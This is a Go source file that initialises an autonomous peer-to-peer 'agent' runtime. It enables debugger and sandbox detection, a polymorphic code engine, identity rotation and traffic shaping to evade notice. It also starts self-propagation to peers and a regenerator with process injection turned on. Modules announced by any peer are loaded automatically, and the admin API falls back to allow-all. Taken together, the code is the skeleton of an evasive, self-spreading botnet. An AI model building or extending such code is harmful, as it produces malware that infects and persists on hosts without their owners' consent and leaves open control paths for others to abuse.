package agent

import (
	"context"
	"crypto/ed25519"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"log/slog"
	"os"
	"path/filepath"
	"time"

	"github.com/libp2p/go-libp2p/core/crypto"
	"github.com/libp2p/go-libp2p/core/peer"
	"golang.org/x/time/rate"

	"github.com/naviNBRuas/APA/pkg/controller"
	manager "github.com/naviNBRuas/APA/pkg/controller/manager"
	task_orchestrator "github.com/naviNBRuas/APA/pkg/controller/task-orchestrator"
	"github.com/naviNBRuas/APA/pkg/controlplane"
	"github.com/naviNBRuas/APA/pkg/health"
	"github.com/naviNBRuas/APA/pkg/module"
	"github.com/naviNBRuas/APA/pkg/networking"
	"github.com/naviNBRuas/APA/pkg/obfuscation"
	"github.com/naviNBRuas/APA/pkg/opa"
	"github.com/naviNBRuas/APA/pkg/persistence"
	"github.com/naviNBRuas/APA/pkg/policy"
	"github.com/naviNBRuas/APA/pkg/polymorphic"
	"github.com/naviNBRuas/APA/pkg/recovery"
	"github.com/naviNBRuas/APA/pkg/regeneration"
	"github.com/naviNBRuas/APA/pkg/swarm"
	"github.com/naviNBRuas/APA/pkg/update"
)

func (rt *Runtime) init(ctx context.Context, config *Config, version string) error {
	logLevel := new(slog.LevelVar)
	switch config.LogLevel {
	case "debug":
		logLevel.Set(slog.LevelDebug)
	case "warn":
		logLevel.Set(slog.LevelWarn)
	case "error":
		logLevel.Set(slog.LevelError)
	default:
		logLevel.Set(slog.LevelInfo)
	}
	logger := slog.New(slog.NewJSONHandler(os.Stdout, &slog.HandlerOptions{Level: logLevel}))

	identity, err := NewIdentity(config.IdentityFilePath)
	if err != nil {
		return fmt.Errorf("failed to initialize identity: %w", err)
	}
	logger.Info("Identity initialized", "agent_peer_id", identity.PeerID)

	ephemeralMgr, err := NewEphemeralIdentityManager(logger, identity.PrivKey, config.EphemeralIdentity.RotationInterval)
	if err != nil {
		return fmt.Errorf("failed to initialize ephemeral identities: %w", err)
	}
	ephemeralMgr.Start(ctx)
	rt.ephemeralIDs = ephemeralMgr
	rt.startTime = time.Now().UTC()
	rt.rateLimiters = make(map[string]*rate.Limiter)

	analysis := obfuscation.NewAntiAnalysis(logger)
	if analysis.DetectDebugger() {
		logger.Warn("Debugger detected during startup")
	}
	if analysis.DetectSandbox() {
		logger.Warn("Sandbox/virtualized environment detected during startup")
	}

	var signingPrivKey ed25519.PrivateKey
	if config.SigningPrivKeyPath != "" {
		signingPrivKeyBytes, err := os.ReadFile(config.SigningPrivKeyPath)
		if err != nil {
			return fmt.Errorf("failed to read signing private key: %w", err)
		}
		signingPrivKeyHex := string(signingPrivKeyBytes)
		signingPrivKeyDecoded, err := hex.DecodeString(signingPrivKeyHex)
		if err != nil {
			return fmt.Errorf("failed to decode signing private key: %w", err)
		}
		signingPrivKey = ed25519.PrivateKey(signingPrivKeyDecoded)
	}

	policyEnforcer, err := policy.NewPolicyEnforcer(config.PolicyPath)
	if err != nil {
		return fmt.Errorf("failed to initialize policy enforcer: %w", err)
	}

	moduleManager, err := module.NewManager(ctx, logger, config.ModulePath, signingPrivKey, policyEnforcer)
	if err != nil {
		return fmt.Errorf("failed to initialize module manager: %w", err)
	}

	repSystem := swarm.NewReputationSystem(logger)
	routingMgr := swarm.NewRoutingManager(logger, repSystem)
	topologyMgr := swarm.NewTopologyManager(logger, repSystem, routingMgr)

	p2p, err := networking.NewP2P(ctx, logger, config.P2P, identity.PeerID, identity.PrivKey, policyEnforcer)
	if err != nil {
		return fmt.Errorf("failed to initialize P2P networking: %w", err)
	}

	privBytes, err := crypto.MarshalPrivateKey(identity.PrivKey)
	if err != nil {
		return fmt.Errorf("failed to marshal identity key: %w", err)
	}
	messengerKey := sha256.Sum256(privBytes)
	appMessenger, err := networking.NewEncryptedMessenger(messengerKey[:])
	if err != nil {
		return fmt.Errorf("failed to initialize encrypted messenger: %w", err)
	}
	transformer := NewTransformationManager(polymorphic.NewEngine(logger), logger)
	advancedRuntime := NewAdvancedRuntime(logger, transformer, appMessenger)

	diurnal := networking.DiurnalCurve{}
	trafficShaper := networking.NewTrafficShaper(0, diurnal, nil, 0)
	netAdapter := &networkStatsAdapter{nm: routingMgr.NetworkMonitor()}
	selective := networking.NewSelectiveForwarder(networking.ForwardPolicy{}, repSystem, netAdapter)
	shapingDecider := networking.NewShapingDecider(selective, trafficShaper, topologyMgr.RegionFor)
	p2p.SetForwardDecider(shapingDecider)

	sinkRes := swarm.NewSinkResistance(topologyMgr, 0, 0, func() {
		if rt.ephemeralIDs != nil {
			rt.ephemeralIDs.ForceRotate()
		}
	})

	elasticityMgr := swarm.NewElasticityManager(logger, nil, 0.7)

	updateManager, err := update.NewManager(logger, config.Update, version)
	if err != nil {
		return fmt.Errorf("failed to initialize update manager: %w", err)
	}

	healthController := health.NewHealthController(logger)
	healthController.RegisterCheck(health.NewProcessLivenessCheck())

	controllerManager := manager.NewManager(logger, config.ControllerPath, policyEnforcer)

	var controllers []controller.Controller
	taskOrchestrator := task_orchestrator.NewTaskOrchestrator(logger, identity.PeerID.String())
	taskOrchestrator.SetP2P(p2p)

	mpWorker := task_orchestrator.NewCommandWorker(taskOrchestrator)
	mpExec := task_orchestrator.NewMultiPathExecutor(logger, []task_orchestrator.Worker{mpWorker}, 0)
	taskOrchestrator.SetExecutor(mpExec)
	controllers = append(controllers, taskOrchestrator)

	rt.config = config
	rt.logger = logger
	rt.identity = identity
	rt.moduleManager = moduleManager
	rt.p2p = p2p
	rt.trafficShaper = trafficShaper
	rt.forwardDecider = shapingDecider
	rt.sinkResistance = sinkRes
	rt.elasticityManager = elasticityMgr
	rt.multiPathExecutor = mpExec
	rt.topologyManager = topologyMgr
	rt.routingManager = routingMgr
	rt.reputationSystem = repSystem
	rt.updateManager = updateManager
	rt.healthController = healthController
	rt.controllerManager = controllerManager
	rt.controllers = controllers
	rt.advanced = advancedRuntime

	activateCount := 0
	advancedRuntime.SetActions(AutonomousActions{
		OnActivate: func(ctx context.Context, state ActivationState) error {
			activateCount++
			rt.logger.Info("Autonomous activation", "peers", state.PeerCount, "network_idle", state.NetworkIdle)
			if rt.ephemeralIDs != nil && activateCount%5 == 0 {
				rt.ephemeralIDs.ForceRotate()
			}
			return nil
		},
		OnPropagate: func(ctx context.Context) error {
			if rt.propagationManager == nil {
				return nil
			}
			return rt.propagationManager.TriggerPropagation(ctx)
		},
		OnAdapt: func(ctx context.Context, profile EnvProfile) error {
			return nil
		},
		OnCredentialRotate: func(ctx context.Context) error {
			if rt.ephemeralIDs != nil {
				rt.ephemeralIDs.ForceRotate()
			}
			return nil
		},
	})

	cpTransport := controlplane.NewControllerTransport(logger, p2p, func() string {
		if rt.ephemeralIDs == nil {
			return ""
		}
		return rt.ephemeralIDs.Current().SessionID
	})
	rt.controlPlane = controlplane.New(logger, cpTransport, config.ControlPlane)

	rt.adminPeerManager = NewAdminPeerManager(logger)
	rt.adminPeerManager.AddAdminPeer(identity.PeerID.String())

	rt.adminPolicyEngine = opa.NewOPAPolicyEngine()
	if config.AdminPolicyPath != "" {
		if err := rt.adminPolicyEngine.LoadPolicy(ctx, config.AdminPolicyPath); err != nil {
			return fmt.Errorf("failed to load admin policy: %w", err)
		}
	} else {
		logger.Warn("No admin policy path configured; admin API will default to allow-all")
	}

	rt.adminAPIKey = config.AdminAPIKey
	if envKey := os.Getenv("APA_ADMIN_API_KEY"); envKey != "" {
		rt.adminAPIKey = envKey
	}
	rt.adminTLSCertPath = config.AdminTLSCertPath
	rt.adminTLSKeyPath = config.AdminTLSKeyPath
	rt.adminTLSClientCA = config.AdminTLSClientCA
	rt.adminTLSRequireClientCert = config.AdminTLSRequireClientCert

	auditPath := filepath.Join(os.TempDir(), "apa-admin-audit.jsonl")
	rt.auditLogger = NewAuditLogger(logger, auditPath)
	rt.logger.Info("Admin audit log initialized", "path", auditPath)

	recoveryController := recovery.NewRecoveryController(logger, config, rt.ApplyConfig, p2p, moduleManager, controllerManager)
	rt.recoveryController = recoveryController

	execPath, err := os.Executable()
	if err != nil {
		execPath = "/usr/local/bin/agentd"
	}
	rt.binaryPath = execPath

	if data, err := os.ReadFile(execPath); err == nil {
		at := obfuscation.NewAntiTampering(logger)
		digest := sha256.Sum256(data)
		at.SetBaselineDigest(digest[:])
		rt.antiTamper = at
		logger.Info("Anti-tampering baseline established", "binary", execPath)
	} else {
		logger.Warn("Failed to read binary for tamper baseline", "error", err)
	}

	regeneratorConfig := &regeneration.Config{
		BinaryPath:              execPath,
		BackupPath:              "/var/lib/apa/backup",
		RegenerationInterval:    1 * time.Hour,
		HealthCheckEndpoint:     "http://localhost:8080/admin/health",
		TrustedPeers:            []string{},
		EnableProcessInjection:  true,
		EnableLibraryEmbedding:  true,
		EnableAdvancedInjection: true,
	}

	rt.regenerator = regeneration.NewRegenerator(logger, regeneratorConfig, p2p, identity.PeerID)

	rt.propagationManager = persistence.NewPropagationManager(logger, execPath, p2p, identity.PeerID.String())

	moduleManager.OnModuleLoad = func(manifest module.Manifest) {
		if err := p2p.AnnounceModule(context.Background(), manifest); err != nil {
			logger.Error("Failed to announce module", "name", manifest.Name, "error", err)
		}
	}

	p2p.FetchModuleHandler = func(name, version string) (*module.Manifest, []byte, error) {
		logger.Info("Received request for module", "name", name, "version", version)
		return moduleManager.GetModuleData(name, version)
	}

	p2p.OnModuleAnnouncement = func(announcement networking.ModuleAnnouncementMessage) {
		if !moduleManager.HasModule(announcement.Manifest.Name, announcement.Manifest.Version) {
			logger.Info("Received announcement for new module", "name", announcement.Manifest.Name, "version", announcement.Manifest.Version, "from", announcement.AnnouncerPeerID)
			go func() {
				peerID, err := peer.Decode(announcement.AnnouncerPeerID)
				if err != nil {
					logger.Error("Failed to parse announcer peer ID", "peer", announcement.AnnouncerPeerID, "error", err)
					return
				}

				ctx := rt.runCtx
				if ctx == nil {
					ctx = context.Background()
				}
				manifest, wasmBytes, err := p2p.FetchModule(ctx, peerID, announcement.Manifest.Name, announcement.Manifest.Version)
				if err != nil {
					logger.Error("Failed to fetch module", "name", announcement.Manifest.Name, "error", err)
					return
				}
				if err := moduleManager.SaveAndLoadModule(manifest, wasmBytes); err != nil {
					logger.Error("Failed to save and load fetched module", "name", announcement.Manifest.Name, "error", err)
				}
			}()
		}
	}

	updateManager.OnUpdateReady = rt.Stop

	if config.Update.EnableP2P {
		updateManager.SetP2PNetwork(p2p)
		p2p.SetFetchUpdateHandler(func(version string) (*update.ReleaseInfo, []byte, error) {
			logger.Info("Received request for update", "version", version)
			return rt.GetCurrentRelease()
		})
	}

	if rt.topologyManager != nil {
		mut := swarm.NewTopologyMutator(rt.topologyManager, swarm.MutationPolicy{}, identity.PeerID)
		go rt.runTopologyMutator(ctx, mut)
	}

	if rt.elasticityManager != nil {
		go rt.runElasticityLoop(ctx)
	}

	return nil
}
